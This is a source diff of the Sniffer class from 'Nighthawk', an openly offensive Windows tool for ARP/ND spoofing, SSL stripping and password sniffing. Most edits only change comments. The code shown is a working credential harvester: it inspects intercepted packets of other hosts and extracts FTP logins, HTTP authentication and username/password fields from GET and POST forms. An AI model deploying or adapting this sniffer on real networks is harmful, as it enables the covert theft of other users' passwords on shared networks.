@@ -7,7 +7,7 @@ using PacketDotNet;
 using System.Threading;
 
 /**
-Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
+Nighthawk - ARP/ND spoofing, simple SSL stripping and password sniffing for Windows
 Copyright (C) 2011  Klemen Bratec
 
 This program is free software: you can redistribute it and/or modify
@@ -25,27 +25,23 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/
 namespace Nighthawk
 {
-    /* Basic password sniffer (currently only HTTP, HTML) */
+    /* Basic password sniffer (currently only HTTP, HTML forms and FTP) */
     public class Sniffer
     {
-        // status
         public bool Started;
 
-        // exclusion
         private bool excludeLocalIP;
         private DeviceInfo deviceInfo;
 
-        // packet queues (packet store for BG thread to work on)
+        // packet queues (packet storage for BG threads)
         public List<TcpPacket> PacketQueue = new List<TcpPacket>();
         private List<TcpPacket> threadQueue = new List<TcpPacket>();
 
-        // encoding converter
         private UTF8Encoding encoding = new UTF8Encoding();
 
-        // worker thread
         private Thread worker;
 
-        // collection of POST requests (hostname/url tracking on incomplete packets)
+        // collection of POST requests (hostname/url tracking for incomplete packets)
         private List<SnifferPostRequest> postRequests;
 
         // collection of FTP logins
@@ -56,7 +52,6 @@ namespace Nighthawk
 
         private void Result(string url, string username, string password, string aditional, SnifferResultType type)
         {
-            // invoke event
             if (SnifferResult != null) SnifferResult(url, username, password, aditional, type);
         }
 
@@ -104,19 +99,16 @@ namespace Nighthawk
             "blobkey"
         };
 
-        // constructor
         public Sniffer(DeviceInfo deviceInfo)
         {
             this.deviceInfo = deviceInfo;
         }
 
-        // start sniffer
+        // start sniffer (exclude local traffic)
         public void Start(bool excludeLocalIP)
         {
-            // set
             this.excludeLocalIP = excludeLocalIP;
 
-            // change status
             Started = true;
 
             postRequests = new List<SnifferPostRequest>();
@@ -131,17 +123,14 @@ namespace Nighthawk
         // stop sniffer
         public void Stop()
         {
-            // change status
             Started = false;
 
-            // stop worker thread
             if(worker != null && worker.IsAlive) worker.Join();
         }
         
-        // worker function that actually parses packets
+        // worker function for parsing packets
         public void Worker()
         {
-            // loop
             while (Started)
             {
                 // copy packets to threadQueue
@@ -157,10 +146,9 @@ namespace Nighthawk
 
                 if (threadQueue.Count > 0)
                 {
-                    // loop through packets
+                    // loop through packets and check them for any useful information
                     foreach (TcpPacket packet in threadQueue)
                     {
-                        // check for parent packet
                         if (packet.ParentPacket == null) continue;
 
                         // check for exclusions
@@ -172,11 +160,10 @@ namespace Nighthawk
                             }
                         }
 
-                        // get IP address
                         var sourceIP = ((IpPacket) packet.ParentPacket).SourceAddress;
                         var destIP = ((IpPacket) packet.ParentPacket).DestinationAddress;
 
-                        // check if FTP packet
+                        // check for FTP packet
                         if (packet.DestinationPort == 21)
                         {
                             var logins = ftpLogins.Where(l => (l.DestinationAddress.ToString() == destIP.ToString() && l.SourceAddress.ToString() == sourceIP.ToString()));
@@ -202,7 +189,6 @@ namespace Nighthawk
                                     var parts = data.Split(' ');
                                     if (parts.Length > 1) login.Password = parts[1].Replace("\r\n", "");
 
-                                    // create result
                                     Result(login.DestinationAddress.ToString(), login.User, login.Password, "/", SnifferResultType.FTP);
 
                                     ftpLogins.Remove(login);
@@ -216,18 +202,17 @@ namespace Nighthawk
                             continue;
                         }
 
-                        // parse HTTP packet
+                        // check for HTTP packet and parse it
                         if (HttpPacket.IsHTTP(packet) || HttpPacket.HasPOST(packet))
                         {
                             var http = new HttpPacket(packet);
 
-                            // save hostnames
+                            // save hostnames for incomplete packets
                             if (http.Header.Type == HttpHeader.PacketType.Request && http.Header.ReqType == HttpHeader.RequestType.POST)
                             {
                                 postRequests.Add(new SnifferPostRequest {SourceAddress = sourceIP, DestinationAddress = destIP, Hostname = http.Header.Host});
                             }
 
-                            // check for any passwords
                             SnifferSearch(http, sourceIP, destIP);
                         }
                     }
@@ -236,7 +221,6 @@ namespace Nighthawk
                 }
                 else
                 {
-                    // some timeout
                     Thread.Sleep(50);
                 }
             }
@@ -244,7 +228,7 @@ namespace Nighthawk
             return;
         }
 
-        // credentials search
+        // search for HTTP 401 and HTML forms passwords
         public void SnifferSearch(HttpPacket packet, IPAddress sourceIP, IPAddress destIP)
         {
             var user = string.Empty;
@@ -270,10 +254,9 @@ namespace Nighthawk
                 catch { }
             }
 
-            // hostname
             var hostname = packet.Header.Host;
 
-            // if there are any GET params
+            // check for any GET params
             if (packet.Header.GetParams.Count > 0)
             {
                 foreach (string[] param in packet.Header.GetParams)
@@ -291,19 +274,16 @@ namespace Nighthawk
                     }
                 }
 
-                // create output
                 if (user != string.Empty && password != string.Empty)
                 {
                     Result((packet.Header.Host != string.Empty ? packet.Header.Host : "/"), Uri.UnescapeDataString(user), Uri.UnescapeDataString(password), "GET method", SnifferResultType.HTML);
                 }
             }
 
-            // reset values
             user = string.Empty;
             password = string.Empty;
-            hostname = string.Empty;
 
-            // if there are any POST params
+            // check for any POST params
             if (packet.PostParams.Count > 0)
             {
                 foreach (string[] param in packet.PostParams)
@@ -347,7 +327,6 @@ namespace Nighthawk
         }
     }
 
-    // sniffer result enum
     public enum SnifferResultType
     {
         HTTPAuth,
@@ -355,7 +334,6 @@ namespace Nighthawk
         FTP
     }
 
-    // sniffer post request data
     public class SnifferPostRequest
     {
         public IPAddress SourceAddress;
@@ -364,7 +342,6 @@ namespace Nighthawk
         public string Hostname;
     }
 
-    // sniffer FTP login data
     public class SnifferFTPlogin
     {
         public IPAddress SourceAddress;
@@ -373,6 +350,5 @@ namespace Nighthawk
         public string Password;
     }
 
-    // OnSnifferResult event delegate
     public delegate void SnifferResultHandler(string url, string username, string password, string aditional, SnifferResultType type);
 }
